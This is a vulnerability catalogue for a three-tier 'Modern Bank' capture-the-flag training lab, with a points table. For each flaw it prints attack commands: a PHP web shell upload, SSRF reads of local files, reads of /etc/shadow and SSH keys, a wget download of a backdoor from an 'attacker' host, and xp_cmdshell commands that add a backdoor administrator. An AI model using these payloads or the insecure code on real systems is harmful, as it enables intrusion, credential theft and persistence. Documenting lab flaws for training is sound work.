# Modern Bank - Vulnerability Documentation

## Summary

This document catalogs all intentional vulnerabilities in the Modern Bank CTF lab for training purposes.

---

## Tier 1: Frontend (Ubuntu LTS - Apache2/PHP)

### 1.1 Insecure File Upload (Critical)

**File:** `/www/profile.php`
**Severity:** Critical (CVSS 9.8)
**Type:** Remote Code Execution (RCE)

**Vulnerability Description:**
The avatar upload feature on the profile page allows authenticated users to upload files. The implementation contains multiple critical flaws:

```php
function validateUpload($file) {
    // VULNERABLE: Only checks extension
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $ALLOWED_EXTENSIONS)) {
        return false;
    }
    return true;
}
```

**Flaws:**
1. Extension-only validation (can use `.php.jpg`, `.phtml`, etc.)
2. No server-side MIME type checking
3. File saved with predictable name (`{user_id}.jpg`)
4. Directory has execute permissions (777)
5. PHP executes uploaded files

**PoC:**
```bash
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Rename to bypass extension check
mv shell.php shell.jpg

# Upload (login required, but credentials are in code)
curl -b "PHPSESSID=<session>" \
     -F "avatar=@shell.jpg" \
     http://target/profile.php

# Execute
curl "http://target/uploads/1.jpg?cmd=whoami"
```

**Impact:** Complete RCE as www-data user

---

### 1.2 Exposed Credentials in .env (High)

**File:** `/.env` (Web-accessible)
**Severity:** High (CVSS 8.6)
**Type:** Information Disclosure

**Content:**
```
BACKEND_IP=192.168.1.100
BACKEND_SSH_USER=deploy
BACKEND_SSH_PASS=DeployPass123!Vulnerable
WINDOWS_HOST=192.168.1.50
WINDOWS_USER=Administrator
WINDOWS_PASS=ModernBank@2024!Admin
```

**Vulnerability:**
- .env file is readable from web root
- No .htaccess protection
- Contains credentials for all tiers
- Credentials visible in source code comments

**Impact:** Lateral movement to Backend and Database VMs

---

### 1.3 Exposed Credentials in Source Code (High)

**File:** `config.php`
**Severity:** High
**Type:** Information Disclosure

**Vulnerable Code:**
```php
define('BACKEND_SSH_USER', 'deploy');
define('BACKEND_SSH_PASS', 'DeployPass123!Vulnerable');
define('BACKEND_SSH_PORT', 22);
// VULNERABILITY: Exposed SSH credentials for Backend VM
```

**Attack:**
```bash
# Read config from shell
curl "http://target/uploads/1.jpg?cmd=cat%20../config.php" | grep SSH
```

---

### 1.4 Directory Traversal / Listings (Medium)

**Directory:** `/uploads/`
**Severity:** Medium (CVSS 5.3)
**Type:** Information Disclosure

**Issue:** Directory listings enabled

```apache
<Directory /var/www/html/uploads>
    Options Indexes FollowSymLinks  # VULNERABLE!
    Require all granted
</Directory>
```

**Attack:**
```bash
curl http://target/uploads/
# Response: Lists all uploaded files including other users' avatars and shells
```

---

## Tier 2: Backend (Ubuntu Server 24 - Node.js API)

### 2.1 SSRF via /api/proxy (High)

**Endpoint:** `POST /api/proxy`
**Severity:** High (CVSS 8.1)
**Type:** Server-Side Request Forgery

**Vulnerable Code:**
```javascript
app.post('/api/proxy', (req, res) => {
    const { url } = req.body;
    
    // VULNERABILITY: No URL validation!
    axios({
        method: 'GET',
        url: url,
        timeout: 5000
    })
    .then(response => {
        res.json(response.data);
    });
});
```

**Attacks:**

1. **Access Internal Services:**
```bash
curl -X POST http://192.168.1.100:8080/api/proxy \
     -H "Content-Type: application/json" \
     -d '{"url": "http://192.168.1.50:1433"}'
     # Access MSSQL port from within network
```

2. **File Access:**
```bash
curl -X POST http://192.168.1.100:8080/api/proxy \
     -H "Content-Type: application/json" \
     -d '{"url": "file:///etc/passwd"}'
```

3. **Internal Network Scanning:**
```bash
curl -X POST http://192.168.1.100:8080/api/proxy \
     -H "Content-Type: application/json" \
     -d '{"url": "http://localhost:3306"}'
     # Probe for MySQL
```

**Impact:** Information disclosure, network reconnaissance

---

### 2.2 Unauthenticated Admin Endpoint (Critical)

**Endpoint:** `GET /cgi-bin/admin.php`
**Severity:** Critical (CVSS 9.1)
**Type:** Unauthorized Access, RCE

**Issue:** No authentication check

```php
// NO authentication or token verification!
$action = $_GET['action'];

switch($action) {
    case 'exec':
        $cmd = $_GET['cmd'];
        $output = shell_exec(escapeshellcmd($cmd));
        // VULNERABLE: Command execution!
        break;
        
    case 'file':
        $file = $_GET['file'];
        $content = file_get_contents($file);  // VULNERABLE: Arbitrary read
        break;
}
```

**Attack Vector:**

**1. Information Gathering:**
```bash
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=info"
# Response:
# {
#   "windows_credentials": {
#     "username": "Administrator",
#     "password": "ModernBank@2024!Admin"
#   }
# }
```

**2. Command Execution:**
```bash
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=exec&cmd=whoami"
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=exec&cmd=cat%20/etc/shadow"
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=exec&cmd=wget%20http://attacker/backdoor.sh%20-O%20/tmp/bd.sh"
```

**3. File Enumeration:**
```bash
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=file&file=/root/.ssh/id_rsa"
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=ssh_keys"
```

**Impact:** Complete system compromise

---

### 2.3 Exposed Environment Variables (High)

**File:** `/api/.env`
**Severity:** High
**Content:** All credentials for Database VM

```
WINDOWS_HOST=192.168.1.50
WINDOWS_USER=Administrator
WINDOWS_PASS=ModernBank@2024!Admin
```

**Attack:**
```bash
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=file&file=../../.env"
```

---

### 2.4 Configuration Dump (Medium)

**Endpoint:** `GET /api/config`
**Severity:** Medium (CVSS 5.3)
**Type:** Information Disclosure

```bash
curl http://192.168.1.100:8080/api/config

# Returns all:
# - Windows credentials
# - Database connection strings
# - API keys
# - Environment configuration
```

---

### 2.5 Exposed Request Logs (Medium)

**Endpoint:** `GET /api/logs`
**Severity:** Medium
**Type:** Information Disclosure

```bash
curl http://192.168.1.100:8080/api/logs

# Shows all API requests including:
# - User IPs
# - Request paths
# - Query parameters (may contain sensitive data)
```

---

## Tier 3: Database VM (Windows 10, MSSQL)

### 3.1 Weak Database Credentials (High)

**Service:** SQL Server (MSSQL)
**Port:** 1433
**Severity:** High
**Type:** Weak Authentication

**Credentials:**
```
Username: Administrator
Password: ModernBank@2024!Admin

Alternative:
Username: sa
Password: ModernBank@2024!Admin
```

**Issue:** Weak password, no multi-factor authentication

**Attack:**
```bash
sqlcmd -S 192.168.1.50 -U Administrator -P "ModernBank@2024!Admin"
# Or
impacket-mssqlclient Administrator:'ModernBank@2024!Admin'@192.168.1.50
```

---

### 3.2 Overprivileged Application User (High)

**Database:** ModernBank
**User:** bankapp
**Severity:** High
**Type:** Privilege Escalation

**Issue:**
```sql
-- bankapp user has db_owner role!
ALTER ROLE db_owner ADD MEMBER bankapp;
```

**Allows:**
- Modify ALL database objects
- Execute stored procedures
- Enable xp_cmdshell
- RCE via CLR assemblies

---

### 3.3 xp_cmdshell Enabled (Critical)

**Component:** SQL Server Extended Stored Procedure
**Severity:** Critical
**Type:** RCE

**Enable:**
```sql
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Exploitation:**
```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'systeminfo';
EXEC xp_cmdshell 'net user backdoor P@ssw0rd /add';
EXEC xp_cmdshell 'net localgroup Administrators backdoor /add';
```

---

### 3.4 Exposed Windows Credentials (High)

**File:** `C:\Program Files\ModernBank\CREDENTIALS.txt`
**Severity:** High
**Content:** Full credentials for RDP, SSH, MSSQL

---

### 3.5 Open Firewall Rules (Medium)

**Issue:** Firewall allows all TCP traffic from Backend VM

```powershell
netsh advfirewall firewall add rule name="RDP from Backend" `
    dir=in action=allow protocol=tcp localport=3389 `
    remoteip=192.168.1.100
```

---

## Network-Level Vulnerabilities

### 4.1 No Network Segmentation (High)

**Issue:** All tiers can communicate freely

```
Tier 1 (Frontend) ←→ Tier 2 (Backend) ←→ Tier 3 (Windows)
Firewall: NONE between tiers
```

**Impact:** Lateral movement has no barriers

### 4.2 No Encrypted Communication (High)

**Issue:** All traffic is plaintext HTTP/SSH

---

## Scoring Guide

| Tier | Vulnerability | Method | Points |
|------|---|---|---|
| 1 | Upload PHP shell | File upload RCE | 100 |
| 1 | Read .env | File enumeration | 50 |
| 2 | SSH to Backend | Use deployed credentials | 100 |
| 2 | Access /api/config | API enumeration | 50 |
| 2 | Execute admin.php action | Unauthenticated RCE | 200 |
| 3 | Connect MSSQL | Network access | 100 |
| 3 | Query Users/Accounts | Database access | 150 |
| 3 | Enable xp_cmdshell | Privilege escalation | 200 |
| 3 | Create backdoor user | RCE via xp_cmdshell | 200 |
| **TOTAL** | **Complete Compromise** | **All phases** | **~1150** |

